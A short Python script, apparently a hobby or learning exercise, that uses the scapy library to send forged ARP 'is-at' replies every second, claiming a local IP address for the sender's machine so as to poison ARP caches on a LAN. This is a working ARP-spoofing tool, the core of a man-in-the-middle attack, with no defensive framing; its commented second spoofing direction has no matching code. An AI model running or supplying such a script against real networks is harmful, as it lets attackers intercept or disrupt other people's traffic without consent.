import scapy.all as sc
import time


def spoof(target_ip, target_mac, host_ip):
    arp_response = sc.ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    sc.send(arp_response, verbose=0)

target_ip = "192.168.23.255"
target_mac = "ff:ff:ff:ff:ff:ff"
host_ip = "192.168.23.8"


while True:
    # telling the `target` that we are the `host`
    spoof(target_ip, target_mac, host_ip)
    # telling the `host` that we are the `target`
    # sleep for one second
    time.sleep(1)


  
